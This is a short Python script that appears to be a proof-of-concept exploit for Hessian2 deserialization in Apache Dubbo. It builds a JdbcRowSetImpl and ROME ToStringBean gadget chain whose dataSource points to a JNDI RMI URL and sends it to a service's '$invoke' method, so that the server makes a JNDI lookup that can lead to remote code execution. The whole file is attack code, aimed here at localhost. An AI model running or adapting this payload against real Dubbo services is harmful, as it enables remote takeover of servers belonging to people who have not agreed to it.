from dubbo.codec.hessian2 import Decoder, new_object
from dubbo.client import DubboClient

ip = "127.0.0.1"
port = 12345
jndi = "rmi://127.0.0.1:1099/sbm9gt"

client = DubboClient(ip, port)

JdbcRowSetImpl = new_object(
    'com.sun.rowset.JdbcRowSetImpl',
    dataSource=jndi,
    strMatchColumns=["foo"]
)
JdbcRowSetImplClass = new_object(
    'java.lang.Class',
    name="com.sun.rowset.JdbcRowSetImpl",
)
toStringBean = new_object(
    'com.rometools.rome.feed.impl.ToStringBean',
#     'com.sun.syndication.feed.impl.ToStringBean',
    beanClass=JdbcRowSetImplClass,
    obj=JdbcRowSetImpl
)

resp = client.send_request_and_return_response(
    service_name='org.example.api.DemoService',
    method_name='$invoke',
#     method_name='sayObject',
    args=[toStringBean])

print(resp)
